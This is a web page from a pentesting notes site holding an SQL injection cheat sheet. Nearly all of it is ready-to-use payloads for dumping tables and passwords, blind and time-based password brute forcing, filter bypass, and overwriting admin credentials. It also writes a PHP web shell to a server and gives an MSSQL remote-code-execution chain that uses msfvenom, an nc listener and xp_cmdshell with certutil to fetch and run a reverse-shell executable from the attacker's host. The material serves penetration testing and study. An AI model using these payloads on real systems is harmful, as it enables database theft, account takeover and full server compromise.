# SQL Injection Cheat Sheet

Last modified: 2024-05-01

Database Reverse Shell SQL Injection Web

---

SQL injection (SQLi) is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution. This page is about the SQL injection cheat sheet.

## [Entry Point Detection](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#entry-point-detection)

Reference: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)

```txt
'
%27
%2527

"
%22
%2522

`
%60
%2560

#
%23
%2523

;
%3B
%253B

)
%29
%2529

')
%27%29
%2527%2529

")
%22%29
%2522%2529
```

  

## [Comment Syntax](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#comment-syntax)

Comment syntax is depending on the database used in the website.

|DBMS|Comments|
|---|---|
|MySQL|`-- -` (add a space after `--`)|
||`#`|
||`/*comment*/`|
||`/*!comment*/`|
|MSSQL|`--`|
||`/*comment*/`|
|Oracle|`--`|
|PostgreSQL|`--`|
||`/*comment*/`|
|SQLite|`--`|
||`/*comment*/`|

  

## [Basic Injection](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#basic-injection)

Check if we can inject SQL commands into forms or URL params in the target website.

```txt
' OR 1=1--
' OR 1=1-- -
' OR 1=1#

' OR '1'='1'--
' OR '1'='1'-- -
' OR '1'='1'#

' OR '1'='1--
' OR '1'='1-- -
' OR '1'='1#

" OR 1=1--
" OR 1=1-- -
" OR 1=1#

') OR 1=1--
') OR 1=1-- -
') OR 1=1#

'; OR 1=1--
'; OR 1=1-- -
'; OR 1=1#

admin or 1=1--
admin or 1=1-- -
admin or 1=1#
```

  

## [Blind Injection - Timing](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#blind-injection---timing)

Reference: [HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection#confirming-with-timing)

Using **sleep** method for each query, if results are displayed with a delay, SQLi affects that.

```html
<!-- MySQL -->
test' AND sleep(10)
test ' OR sleep(10)

<!-- MSSQL -->
test' WAITFOR DELAY '0:0:10'

<!-- Oracle -->
test' AND DBMS_SESSION.SLEEP(10)

<!-- PostgreSQL -->
test' AND pg_sleep(10)
test' OR pg_sleep(10)
test' || pg_sleep(10)

<!-- SQLite -->
test' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
```

  

## [Brute Force Values](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#brute-force-values)

```html
' password LIKE '%'-- -
' password LIKE BINARY '%'-- -

' password REGEXP '^[a-z]*'-- -
' password REGEXP BINARY '^[a-z]*'-- -
```

  

## [WAF Bypass](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#waf-bypass)

Reference: [OWASP](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

If website filters to prevent our payloads, we need to bypass the filter.

### [HTTP Parameter Pollution](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#http-parameter-pollution)

We may inject by splitting the parameter values on the same keys.

```html
/?id='+select+1&id=2,3+from+users+where+id=1-- -
```

### [New Line (’%0A’)](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#new-line-(%E2%80%99%250a%E2%80%99))

By prepending the new line (URL encoded to ‘%0A’), subsequent syntax may circumvent the filtering.

```html
/?id=%0A' OR 1=1-- -
```

  

## [Version Detection](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#version-detection)

### [MSSQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#mssql)

```html
' UNION SELECT @@version--
' UNION SELECT NULL,@@version--
```

### [MySQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#mysql)

```html
' UNION SELECT @@version-- -
' UNION SELECT @@version#

' UNION SELECT NULL,@@version-- -
' UNION SELECT NULL,@@version#
```

### [Oracle](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#oracle)

```html
' UNION SELECT 'a' FROM dual--
' UNION SELECT 'a','b' FROM dual--
' UNION SELECT * FROM v$version--
' UNION SELECT BANNER,NULL FROM v$version--
```

### [PostgreSQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#postgresql)

```html
' UNION SELECT version()--
' UNION SELECT NULL,version()--
```

### [SQLite](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#sqlite)

```html
' UNION SELECT sqlite_version()--
' UNION SELECT sqlite_version(),NULL--
```

  

## [Detect Number of Columns](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#detect-number-of-columns)

The following commands detect the number of the columns in the database.

```html
' UNION SELECT NULL--
' UNION SELECT NULL-- -

' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL-- -

' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL-- -

' UNION SELECT 'a',NULL,NULL--
' UNION SELECT 'a',NULL,NULL-- -

' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,'a',NULL-- -

' UNION SELECT NULL,NULL,'a'--
' UNION SELECT NULL,NULL,'a'-- -
```

### [UNION ALL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#union-all)

We can combine the result of the query into the one column by using “UNION ALL” syntax.

```txt
' UNION ALL SELECT "' UNION SELECT flag,NULL,NULL from flags-- -",NULL,NULL from users-- -
```

  

## [List Table Names](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#list-table-names)

Get the table name in which you want to get the information.

### [MSSQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#mssql-1)

```txt
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### [MySQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#mysql-1)

```html
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT table_name,NULL FROM information_schema.tables#

<!-- group_concat(): Dump all tables simultaneously -->
' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables-- -
' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables#
```

### [PostgreSQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#postgresql-1)

```txt
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### [Oracle](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#oracle-1)

```txt
' UNION SELECT table_name,NULL FROM all_tables--
```

### [SQLite](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#sqlite-1)

```html
' UNION SELECT tbl_name FROM sqlite_master--
' UNION SELECT tbl_name,NULL FROM sqlite_master--
```

  

## [List Column Names](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#list-column-names)

Get column names from the table name which we got.

### [MSSQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#mssql-1-1)

```txt
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'--
```

### [MySQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#mysql-1-1)

```txt
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'#
```

### [PostgreSQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#postgresql-1-1)

```txt
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'--
```

### [Oracle](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#oracle-1-1)

```txt
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='table_name'--
```

### [SQLite](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#sqlite-1-1)

```html
' UNION SELECT column
```

  

## [List Information in the Table](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#list-information-in-the-table)

Get information in the table.  
For instance, suppose we want to get the username and password from the table named 'users'.

```txt
' UNION SELECT username,password FROM users--
' UNION SELECT username,password FROM users-- -

' UNION SELECT username || '~' || password FROM users--
' UNION SELECT username || '~' || password FROM users-- -

' UNION SELECT NULL,username || '~' || password FROM users--
' UNION SELECT NULL,username || '~' || password FROM users-- -

' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'--
' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'-- -

' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'--
' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'-- -

' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'--
' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'-- -
```

**BINARY**: Sensitive to upper case and lower case.

```txt
' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'--
' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'-- -
```

### [Dumping Table](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#dumping-table)

```html
' UNION SELECT table_name FROM table_name--
' UNION SELECT table_name,NULL FROM table_name--
```

  

## [Fetch All Entities](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#fetch-all-entities)

```txt
' UNION SELECT * FROM users-- -
'; SELECT * FROM users-- -
```

  

## [Modify/Insert Data](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#modify%2Finsert-data)

### [Insert Arbitrary Data](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#insert-arbitrary-data)

```html
' INSERT INTO users (username, password) VALUES ('admin', 'pass')-- -
'; INSERT INTO users (username, password) VALUES ('admin', 'pass')-- -

<!-- Insert a payload -->
' INSERT INTO products (id, name, price) VALUES (999, "<?php system('id'); ?>", 10)-- - 
```

### [Update Arbitrary Data](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#update-arbitrary-data)

```html
' UPDATE users SET password='password123' WHERE username='admin'-- -
' UPDATE users SET password='password123' WHERE id=1-- -
```

### [Upsert](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#upsert)

This is a combination of **`UPDATE`** and **`INSERT`** operation. If a particular row already exists, it will be updated with new values. Here are examples that update password for the existing **`admin`** user.

```html
<!-- MySQL -->
INSERT INTO users (username, password) VALUES('admin', '') ON DUPLICATE KEY UPDATE password=''-- -

<!-- PostgreSQL, SQLite -->
INSERT INTO users (username, password) VALUES ('admin', '') ON CONFLICT (username) DO UPDATE SET password='password'--
```

  

## [Command Injection](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#command-injection)

```text
' UNION SELECT NULL,sys_eval('whoami') FROM users-- -
```

  

## [RCE](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#rce)

### [MSSQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#mssql-1-1-1)

1. In attack machine, prepare a payload for reverse shell.

Replace the ip address of `LHOST` with your ip.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
```

2. In attack machine, start a local web server to host the payload file.

```bash
python3 -m http.server 8000
```

3. In attack machine, start a listener to receiver incoming connection.

```bash
nc -lvnp 4444
```

4. In target website, execute the shell command with SQLi.

```html
<!-- 1. Enable the shell command -->
' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

<!-- 2. Download our payload -->
' ; EXEC xp_cmdshell 'certutil -urlcache -f http://10.0.0.1:8000/shell.exe C:\Windows\Temp\shell.exe';--

<!-- 3. Execute the payload -->
' ; EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';--
```

After execution, we may get a shell of target system.

  

## [Error-based SQLi](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#error-based-sqli)

Reference: [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

We might be able to gather information of the database by leading the error message. We can construct SQLi while checking error messages.  
Here are MySQL injection examples.

```html
' AND 1=CAST((SELECT 1) AS int)-- -
' AND 1=CAST((SELECT password FROM users) AS int)-- -
<!-- Limit only one row if required -->
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)
```

In the example above, we may see the password revealed in the error message.

  

## [Blind SQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#blind-sql)

### [1. Check if the SQL Injection Works](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#1.-check-if-the-sql-injection-works)

```txt
' AND '1'='1
' AND '1'='2
' AND (SELECT 'a' FROM users LIMIT 1)='a
```

### [2. Check if Content Value Exists](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#2.-check-if-content-value-exists)

For example, check if username 'administrator' exists in 'users'

```txt
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

If so, determine the password length

```txt
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
...
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=8)='a
```

Brute force password's character

```txt
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='$a$
...
' AND (SELECT SUBSTRING(password,8,1) FROM users WHERE username='administrator')='$a$
```

  

## [Blind SQL (Time-based)](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#blind-sql-(time-based))

### [1. First Check](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#1.-first-check)

- **MySQL**
    
    ```html
    ' AND sleep(5)-- -
    ```
    

**PostgreSQL**

```html
'||pg_sleep(10)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--

<!--- https://hackerone.com/reports/2209130 -->
');(SELECT 1234 FROM PG_SLEEP(10))--
```

### [2. Check if Content Value Exists](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#2.-check-if-content-value-exists-1)

```txt
'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

If so, determine the password length

```txt
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
...
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)=8) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Brute force password character

```txt
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
...
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,8,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

  

## [Conditional Error](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#conditional-error)

### [1. First Check](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#1.-first-check-1)

```txt
'
''
'||(SELECT '')||'
'||(SELECT '' FROM dual)||'
'||(SELECT '' FROM fake_table)||'
'||(SELECT '' FROM users WHERE ROWNUM = 1||'
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

### [2. Check if Content Value Exists](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#2.-check-if-content-value-exists-1-1)

```txt
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

If so, determine the password length

```txt
''||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
''||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
...
''||(SELECT CASE WHEN LENGTH(password)=8 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Brute force password character

```txt
'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
...
'||(SELECT CASE WHEN SUBSTR(password,8,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

  

## [Writing Files](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#writing-files)

We can write arbitary code to a file as below.

```html
' SELECT '<?php echo system("id");?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

### [HEX Encoded Payloads](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#hex-encoded-payloads)

```html
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E-- -
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E#
```

**'0x3C3F...'** is a hex encoded text meaning **"<?php system($_GET["cmd"]) ?>"**. After injectin, we can access to **`http://10.0.0.1/shell.php?cmd=whoami`**.

  

## [XML Filter Bypass](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#xml-filter-bypass)

Reference: [PortSwigger](https://portswigger.net/web-security/sql-injection)

```xml
<storeId>
    <!-- Convert 'S' to HTML entity -->
    1 &#x53;ELECT * FROM information_schema.tables
</storeId>
```

If you use **Burp Suite**, it’s recommended to use the **Hackvertor** extention to obfuscate payloads.  
For example, in **Repeater**, highlight the string which you want to encode. Then right-click and select **Extensions → Hackvertor → Encode → hex_entities**.  
After that, our payload is as below.

```xml
<storeId>
    <@hex_entities>
        1 UNION SELECT * FROM information_schema.tables
    <@/hex_entities>
</storeId>
```

  

## [XPATH Injection](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#xpath-injection)

### [MySQL](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#mysql-1-1-1)

```bash
' AND UPDATEXML(NULL,CONCAT(0x3a,(SELECT SUBSTRING(password,1,16) FROM users)),null)-- -
```

If the error result appears such like the following, we retrieved the piece of the password hash.

```bash
XPATH syntax error: ':3ac6b24dc611a692'
```

So we can find the remaining of the password hash by injecting below command.

```bash
' AND UPDATEXML(NULL,CONCAT(0x3a,(SELECT SUBSTRING(password,17,32) FROM users)),null)-- -
```

  

## [Truncation Attack](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/#truncation-attack)

We can add another user which is the same name as the existing user by registering the same name user with enough “spaces” to truncate a username.  
First off, check the table schema if can.

```sh
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

Now send POST request with a payload to create a new admin.

```sh
# POST request
POST /create-user HTTP/1.1

# Create another new "admin" with more than 64 characters. Btw, "+" means the spaces.
username=admin+++++++++++++++++++++++++++++++++++++++++++++++++++++++++random&password=password
```

Then check if we can login with a new admin.

```sh
username=admin&password=password
```

Fetch the admin's information with the original password.

```sh
SELECT * FROM users WHERE username='admin';

# It should return the values are the real admin's information.
username = admin
password = <REAL_ADMIN_PASSWORD>
```

https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/

